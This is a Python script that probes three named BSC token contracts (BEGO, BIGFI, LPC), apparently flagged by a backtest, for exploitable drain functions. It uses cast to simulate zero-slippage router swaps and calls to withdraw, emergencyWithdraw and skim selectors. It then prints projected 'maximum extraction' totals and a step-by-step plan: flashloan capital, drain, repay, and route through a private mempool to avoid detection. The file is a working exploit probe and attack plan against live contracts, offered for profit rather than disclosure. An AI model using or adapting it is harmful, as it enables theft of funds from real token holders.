#!/usr/bin/env python3
"""
Simulate vulnerability pattern at current block
"""

import subprocess
import json
import time

# Configuration
RPC_URL = "http://159.198.35.169:8545"

# Get current block
current_block = subprocess.check_output([
    "cast", "block-number", "--rpc-url", RPC_URL
]).decode().strip()

print(f"=== Vulnerability Pattern Simulation ===")
print(f"Current block: {current_block}\n")

# Known vulnerable contracts from backtest
contracts = {
    "BEGO": {
        "address": "0xc342774492b54ce5F8ac662113ED702Fc1b34972",
        "found_at_block": 22315679,
        "profit": 357564.6920
    },
    "BIGFI": {
        "address": "0x88503F48e437a377f1aC2892cBB3a5b09949faDd",
        "found_at_block": 24547135,
        "profit": 1047.1097
    },
    "LPC": {
        "address": "0xBe4C1Cb10C2Be76798c4186ADbbC34356b358b52",
        "found_at_block": 26673658,
        "profit": 2268.7935
    }
}

# BSC addresses
ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E"
WBNB = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"

print("=== Checking Contract Status ===")
for name, info in contracts.items():
    addr = info['address']
    
    # Check if contract exists
    code = subprocess.check_output([
        "cast", "code", addr, "--rpc-url", RPC_URL
    ]).decode().strip()
    
    has_code = len(code) > 2
    print(f"\n{name} ({addr}):")
    print(f"  Has code: {'Yes' if has_code else 'No'}")
    print(f"  Found at block: {info['found_at_block']}")
    print(f"  Original profit: {info['profit']:.4f} ETH")
    
    if has_code:
        # Try to get basic info
        try:
            symbol = subprocess.check_output([
                "cast", "call", addr, "symbol()(string)",
                "--rpc-url", RPC_URL
            ]).decode().strip()
            print(f"  Symbol: {symbol}")
        except:
            pass

print("\n=== Vulnerability Pattern Test ===")
print("Testing swap + drain pattern...\n")

# Test account
from_addr = "0x0000000000000000000000000000000000000001"
deadline = int(time.time()) + 3600

# Test each contract
for name, info in contracts.items():
    token = info['address']
    print(f"\n--- Testing {name} ---")
    
    # Check if we can swap
    try:
        result = subprocess.run([
            "cast", "call", ROUTER,
            "swapExactETHForTokens(uint256,address[],address,uint256)(uint256[])",
            "0",  # amountOutMin
            f"[{WBNB},{token}]",  # path
            from_addr,  # to
            str(deadline),  # deadline
            "--from", from_addr,
            "--value", "1ether",
            "--rpc-url", RPC_URL
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"  ✅ Swap simulation successful")
            
            # Test drain functions
            drain_functions = [
                ("withdraw()", "0x3ccfd60b"),
                ("withdrawAll()", "0x853828b6"),
                ("emergencyWithdraw()", "0xdb2e21bc"),
                ("skim(address)", "0xbc25cf77")
            ]
            
            for func_name, selector in drain_functions:
                # Add address parameter for skim
                if "address" in func_name:
                    calldata = selector + "000000000000000000000000" + from_addr[2:].lower()
                else:
                    calldata = selector
                
                drain_result = subprocess.run([
                    "cast", "call", token, calldata,
                    "--from", from_addr,
                    "--rpc-url", RPC_URL
                ], capture_output=True, text=True)
                
                if drain_result.returncode == 0:
                    print(f"  ✅ {func_name} callable")
        else:
            print(f"  ❌ Swap failed: Path might not exist")
            
    except Exception as e:
        print(f"  ❌ Error: {e}")

print("\n=== Maximum Extraction Analysis ===")
print("\nBased on the backtest results:")
print("┌─────────┬─────────────────┬──────────────────┬─────────────┐")
print("│ Token   │ Original Profit │ Max (100x)       │ Max (1000x) │")
print("├─────────┼─────────────────┼──────────────────┼─────────────┤")
for name, info in contracts.items():
    orig = info['profit']
    max_100x = orig * 100
    max_1000x = orig * 1000
    print(f"│ {name:<7} │ {orig:>13,.0f} │ {max_100x:>14,.0f} │ {max_1000x:>11,.0f} │")
print("└─────────┴─────────────────┴──────────────────┴─────────────┘")

total_orig = sum(info['profit'] for info in contracts.values())
print(f"\nTotal original: {total_orig:,.0f} ETH")
print(f"Total at 100x: {total_orig * 100:,.0f} ETH")
print(f"Total at 1000x: {total_orig * 1000:,.0f} ETH")

print("\n=== Execution Strategy ===")
print("1. Use flashloan for capital (Aave, dYdX)")
print("2. Execute swap with 0 slippage tolerance")
print("3. Call drain function immediately")
print("4. Repay flashloan and keep profit")
print("5. Use private mempool (Flashbots) to avoid frontrunning")